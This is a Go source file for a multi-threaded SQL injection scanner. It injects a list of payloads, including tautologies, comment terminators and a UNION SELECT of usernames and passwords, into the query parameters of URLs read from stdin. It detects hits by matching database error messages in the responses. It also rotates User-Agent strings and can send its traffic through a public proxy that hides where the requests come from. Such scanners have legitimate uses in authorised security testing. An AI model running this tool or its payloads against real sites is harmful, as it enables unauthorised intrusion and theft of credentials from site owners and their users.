package main

import (
	"bufio"
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

var (
	verbose    bool
	useProxy   bool
	paramFile  string
	sqlErrors = []string{
		"You have an error in your SQL syntax",
		"Warning: mysql_",
		"Unclosed quotation mark",
		"quoted string not properly terminated",
		"ODBC SQL Server Driver",
		"PostgreSQL query failed",
		"SQLSTATE[42000]",
		"Microsoft JET Database Engine error",
		"SQLite error",
		"Syntax error or access violation",
		"invalid SQL statement",
		"unexpected EOF in statement",
		"unterminated quoted string",
		"syntax error at or near",
		"Incorrect syntax near",
		"PL/pgSQL function returned no value",
		"division by zero in SQL statement",
		"SQLSTATE[HY000]",
		"Incorrect string value",
		"Data truncated for column",
		"Subquery returned more than 1 row",
	}
	testCharacters = []string{
		"'", "\"", "--", "#", ")", "' OR '1'='1", ";--", "' OR '1'='1' --", "' OR '1'='1' #",
		"admin' --", "admin' #", "admin' OR 1=1 --", "admin' OR 1=1 #",
		"' OR 'x'='x", "' OR 1=1 --", "' OR 1=1 #", "' OR 1=1/*",
		"1' AND 1=1 --", "1' AND 1=1 #", "1' AND 1=1/*",
		"' UNION SELECT null,null --", "' UNION SELECT username,password FROM users --",
	}
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
	}
	mutex sync.Mutex
	paramsToInject map[string]bool
)

func randomUserAgent() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func loadParams(file string) map[string]bool {
	params := make(map[string]bool)
	f, err := os.Open(file)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[ERROR] Failed to open param file: %s\n", file)
		return params
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		params[strings.TrimSpace(scanner.Text())] = true
	}
	return params
}

func injectSQL(urlStr string) {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		if verbose {
			fmt.Printf("[ERROR] Failed to parse URL: %s\n", urlStr)
		}
		return
	}
	query := parsedURL.Query()
	for param := range query {
		if len(paramsToInject) > 0 && !paramsToInject[param] {
			continue
		}
		for _, char := range testCharacters {
			for _, payload := range []string{char, url.QueryEscape(char)} {
				modifiedQuery := url.Values{}
				for k, v := range query {
					if k == param {
						modifiedQuery.Set(k, v[0]+payload)
					} else {
						modifiedQuery[k] = v
					}
				}
				parsedURL.RawQuery = modifiedQuery.Encode()
				testURL := parsedURL.String()
				if useProxy {
					testURL = "https://api.allorigins.win/raw?url=" + url.QueryEscape(testURL)
				}
				if checkSQLi(testURL, param, payload) {
					return
				}
			}
		}
	}
}

func checkSQLi(testURL, param, char string) bool {
	req, err := http.NewRequest("GET", testURL, nil)
	if err != nil {
		if verbose {
			fmt.Printf("[ERROR] Failed to create request: %s\n", testURL)
		}
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	client := &http.Client{
		Transport: &http.Transport{
			ForceAttemptHTTP2: true,
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	bodyBytes := make([]byte, 4096)
	n, _ := resp.Body.Read(bodyBytes)
	body := string(bodyBytes[:n])

	for _, errMsg := range sqlErrors {
		if strings.Index(body, errMsg) != -1 {
			mutex.Lock()
			fmt.Printf("[VULNERABLE] %s (Param: %s, Char: '%s')\n", testURL, param, char)
			mutex.Unlock()
			return true
		}
	}
	return false
}

func worker(urls <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	for url := range urls {
		injectSQL(url)
	}
}

func main() {
	flag.BoolVar(&verbose, "verbose", false, "Enable verbose logging")
	flag.BoolVar(&useProxy, "dp", false, "Use allorigins.win proxy for requests")
	flag.StringVar(&paramFile, "params", "", "File containing parameters to inject")
	flag.Parse()

	rand.Seed(time.Now().UnixNano())

	if paramFile != "" {
		paramsToInject = loadParams(paramFile)
	}

	if verbose {
		fmt.Println("[INFO] Starting SQLi Scanner...")
	}

	scanner := bufio.NewScanner(os.Stdin)
	var wg sync.WaitGroup
	urlChan := make(chan string, 50)

	workerCount := 20
	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go worker(urlChan, &wg)
	}

	for scanner.Scan() {
		urlStr := strings.TrimSpace(scanner.Text())
		if urlStr == "" {
			continue
		}
		urlChan <- urlStr
	}
	close(urlChan)
	wg.Wait()

	if verbose {
		fmt.Println("[INFO] Scan completed.")
	}
}
